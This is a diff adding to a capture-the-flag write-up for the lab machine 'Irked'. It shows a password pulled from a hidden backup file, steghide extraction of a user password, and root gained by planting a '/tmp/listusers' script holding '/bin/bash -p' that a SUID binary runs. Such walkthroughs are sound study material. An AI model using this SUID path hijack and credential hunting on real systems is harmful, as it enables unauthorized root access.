@@ -149,7 +149,115 @@ drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 djmardov
 drwxr-xr-x  3 ircd     root     4096 Sep  5  2022 ircd
 ```
 
+Inside, there is a ```/Documents``` directory that holds the user flag and a hidden backup file.
+
+```
+ircd@irked:/home/djmardov/Documents$ ls -la
+total 12
+drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
+drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt
+ircd@irked:/home/djmardov/Documents$ cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+
+The ```steg``` likely refers to steganography. The password might be hidden inside the image we saw on the website.
+
+Let's use ```steghide``` to extract it.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-x6un9clcc1]─[~]
+└──╼ [★]$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-x6un9clcc1]─[~]
+└──╼ [★]$ cat pass.txt 
+Kab6h+m+bbp2J:HG
+```
+
+We get a password, which works for the ```djmardov``` user.
+
+```
+ircd@irked:~$ su - djmardov
+Password: 
+djmardov@irked:~$ whoami
+djmardov
+```
+
+We can proceed to get the user flag from here.
+
 ## Root Flag
+
+```sudo``` isn't installed on the machine.
+
+There are some interesting binaries with the SUID bit set.
+
+```
+djmardov@irked:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/tmp/bash
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+```
+
+I haven't seen ```viewuser``` yet.
+
+Let's see what it does.
+
+```
+djmardov@irked:~$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2026-10-04 21:41 (:0)
+sh: 1: /tmp/listusers: not found
+```
+
+It does something with ```/tmp/listusers```, likely using ```sh``` to run it. If that is the case, we could just create a script containing malicious code with the same name at the same location, and when we run ```viewuser```, it should execute as ```root```.
+
+Let's try it.
+
+Here is our new ```/tmp/listusers```.
+
+```
+djmardov@irked:~$ cat /tmp/listusers
+/bin/bash -p
+```
+
+After running ```viewuser```, we get ```root```.
+
+```
+djmardov@irked:~$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2026-10-04 21:41 (:0)
+root@irked:~# whoami
+root
+```
+
+We can get the root flag from here.
+
+Nice pwn!
 
 ## Contact
 
